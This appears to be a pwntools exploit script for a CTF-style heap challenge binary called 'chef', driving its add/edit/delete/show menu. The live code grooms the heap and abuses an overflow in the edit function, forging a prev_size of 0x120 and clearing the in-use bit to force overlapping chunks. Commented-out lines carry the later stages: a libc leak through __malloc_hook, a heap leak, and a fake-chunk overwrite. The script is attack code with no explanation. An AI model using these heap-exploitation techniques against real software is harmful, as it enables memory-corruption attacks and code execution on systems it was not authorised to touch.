from pwn import *

p = process('./chef')
elf = ELF('./chef')
lib = elf.libc


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def show():
    choice(b'1')


def add(size_, mess):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)


def edit(id_, size_, mess):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)


def delete(id_):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)


choice(b'4')
add(0x10, b'aa')  # 0
add(0x10, b'aa')  # 1

add(0x80, b'aa')  # 2
add(0x20, b'bb')  # 3
add(0x20, b'bb')  # 4
add(0x20, b'bb')  # 5
add(0x80, b'aa')  # 6
add(0x10, b'cc')  # 7
delete(b'2')
payload = b'a' * 0x20 + p64(0x120) + b'\x90'
edit(b'5', 0x30, payload)
delete(b'6')
add(0x80, b'a')  # 2
show()
add(0x20, b'aa')
# malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 88 - 0x10
# base_addr = malloc_hook - lib.sym['__malloc_hook']
# print(hex(base_addr))
# delete(b'1')
# add(0x20, b'a')
# add(0x20, b'a')
# delete(b'4')
# delete(b'3')
# show()
# p.recvuntil(b'1 : ')
# heap_addr = (u64(p.recvuntil(b'2')[: -1].ljust(8, b'\00')) >> 12) << 12
# print(hex(heap_addr))
# payload = b'a' * 0x10 + p64(0) + p64(0x21) + p64(0x601ffa)
# edit(b'0', 0x30, payload)
gdb.attach(p)
p.interactive()
